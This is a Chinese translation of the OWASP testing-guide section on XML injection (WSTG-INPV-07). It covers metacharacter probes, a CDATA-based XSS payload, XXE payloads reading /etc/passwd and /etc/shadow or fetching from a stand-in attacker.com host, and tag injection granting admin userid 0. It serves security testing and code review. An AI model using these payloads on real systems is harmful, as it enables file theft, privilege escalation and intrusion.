# 测试 XML 注入

|ID          |
|------------|
|WSTG-INPV-07|

## 概述

XML 注入测试是指测试人员尝试向应用程序注入 XML 文档。如果 XML 解析器未能根据上下文验证数据，则测试将产生阳性结果。

本节介绍 XML 注入的实际示例。首先，将定义 XML 风格的通信并解释其工作原理。然后，介绍发现方法，即尝试插入 XML 元字符。完成第一步后，测试人员将获得一些关于 XML 结构的信息，从而可以尝试注入 XML 数据和标签（标签注入）。

## 测试目标

- 识别 XML 注入点。
- 评估可实现的利用类型及其严重性。

## 如何测试

假设有一个 Web 应用程序使用 XML 风格通信来执行用户注册。这是通过创建并在 `xmlDb` 文件中添加一个新的 `user` 节点来实现的。

假设 xmlDB 文件如下：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

当用户通过填写 HTML 表单进行注册时，应用程序会在标准请求中接收用户数据，为简单起见，我们假设该请求以 `GET` 请求形式发送。

例如，以下值：

```txt
用户名: tony
密码: Un6R34kb!e
电子邮件: s4tan@hell.com
```

将生成请求：

`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

然后，应用程序构建以下节点：

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

该节点将被添加到 xmlDB 中：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### 发现

测试应用程序是否存在 XML 注入漏洞的第一步是尝试插入 XML 元字符。

XML 元字符包括：

- 单引号：`'` - 如果未进行清理，当注入的值将作为标签中属性值的一部分时，此字符可能在 XML 解析期间引发异常。

例如，假设存在以下属性：

`<node attrib='$inputValue'/>`

因此，如果：

`inputValue = foo'`

被实例化并作为 attrib 值插入：

`<node attrib='foo''/>`

那么，生成的 XML 文档格式不正确。

- 双引号：`"` - 此字符与单引号含义相同，如果属性值包含在双引号中，则可以使用它。

`<node attrib="$inputValue"/>`

因此，如果：

`$inputValue = foo"`

替换后得到：

`<node attrib="foo""/>`

生成的 XML 文档无效。

- 尖括号：`>` 和 `<` - 在用户输入中添加开或闭尖括号，如：

`用户名 = foo<`

应用程序将构建一个新节点：

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

但由于存在开 '<'，生成的 XML 文档无效。

- 注释标签：`<!--/-->` - 此字符序列被解释为注释的开始/结束。因此，通过在 Username 参数中注入其中一个：

`用户名 = foo<!--`

应用程序将构建如下节点：

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

这将不是一个有效的 XML 序列。

- 与号：`&` - 与号在 XML 语法中用于表示实体。实体的格式为 `&symbol;`。实体映射到 Unicode 字符集中的某个字符。

例如：

`<tagnode>&lt;</tagnode>`

格式正确且有效，表示 `<` ASCII 字符。

如果 `&` 本身未用 `&amp;` 编码，则可用于测试 XML 注入。

事实上，如果提供如下输入：

`用户名 = &foo`

将创建一个新节点：

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

但是，文档再次无效：`&foo` 未以 `;` 终止，且 `&foo;` 实体未定义。

- CDATA 部分分隔符：`<!\[CDATA\[ / ]]>` - CDATA 部分用于转义包含否则会被识别为标记的字符的文本块。换句话说，包含在 CDATA 部分中的字符不会被 XML 解析器解析。

例如，如果需要在文本节点中表示字符串 `<foo>`，可以使用 CDATA 部分：

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

这样 `<foo>` 就不会被解析为标记，而是被视为字符数据。

如果按以下方式创建节点：

`<username><![CDATA[<$userName]]></username>`

测试人员可以尝试注入结束 CDATA 字符串 `]]>`，以尝试使 XML 文档无效。

`userName = ]]>`

这将变为：

`<username><![CDATA[]]>]]></username>`

这不是一个有效的 XML 片段。

另一个测试与 CDATA 标签有关。假设 XML 文档被处理以生成 HTML 页面。在这种情况下，CDATA 部分分隔符可能被直接删除，而无需进一步检查其内容。然后，可以注入 HTML 标签，这些标签将被包含在生成的页面中，完全绕过现有的清理例程。

让我们考虑一个具体示例。假设有一个节点包含一些将显示给用户的文本。

```xml
<html>
    $HTMLCode
</html>
```

然后，攻击者可以提供以下输入：

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

并获得以下节点：

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

在处理过程中，CDATA 部分分隔符被删除，生成以下 HTML 代码：

```html
<script>
    alert('XSS')
</script>
```

结果是应用程序容易受到 XSS 攻击。

外部实体：可以通过定义新实体来扩展有效实体集。如果实体的定义是 URI，则该实体称为外部实体。除非另行配置，否则外部实体强制 XML 解析器访问 URI 指定的资源，例如本地机器或远程系统上的文件。这种行为使应用程序面临 XML 外部实体（XXE）攻击，可用于对本地系统进行拒绝服务、未经授权访问本地机器上的文件、扫描远程机器以及对远程系统进行拒绝服务。

要测试 XXE 漏洞，可以使用以下输入：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

此测试可能导致 Web 服务器崩溃（在 UNIX 系统上），如果 XML 解析器尝试用 /dev/random 文件的内容替换实体。

其他有用的测试如下：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

### 标签注入

完成第一步后，测试人员将获得一些关于 XML 文档结构的信息。然后，可以尝试注入 XML 数据和标签。我们将展示这如何导致权限提升攻击的示例。

让我们考虑之前的应用程序。通过插入以下值：

```txt
用户名: tony
密码: Un6R34kb!e
电子邮件: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

应用程序将构建一个新节点并将其附加到 XML 数据库中：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

生成的 XML 文件格式正确。此外，对于用户 tony，与 userid 标签关联的值很可能是最后出现的那个，即 0（管理员 ID）。换句话说，我们注入了一个具有管理员权限的用户。

唯一的问题是 userid 标签在最后一个用户节点中出现了两次。通常，XML 文档与模式或 DTD 相关联，如果不遵守，则会被拒绝。

假设 XML 文档由以下 DTD 指定：

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

请注意，userid 节点定义为基数 1。在这种情况下，如果 XML 文档在处理之前根据其 DTD 进行验证，则我们之前展示的攻击（以及其他简单攻击）将不起作用。

然而，如果测试人员控制了违规节点（本例中为 userid）之前某些节点的值，则此问题可以解决。事实上，测试人员可以通过注入注释开始/结束序列来注释掉该节点：

```txt
用户名: tony
密码: Un6R34kb!e</password><!--
电子邮件: --><userid>0</userid><mail>s4tan@hell.com
```

在这种情况下，最终的 XML 数据库为：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

原始的 `userid` 节点已被注释掉，只留下注入的那个。文档现在符合其 DTD 规则。

## 源代码审查

如果未正确配置，以下 Java API 可能容易受到 XXE 攻击。

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

检查源代码，确保 docType、外部 DTD 和外部参数实体被设置为禁止使用。

- [XML 外部实体（XXE）防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

此外，如果版本低于 3.10.1，Java POI Office 阅读器可能容易受到 XXE 攻击。

POI 库的版本可以从 JAR 的文件名中识别。例如，

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

以下源代码关键字可能适用于 C。

- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader
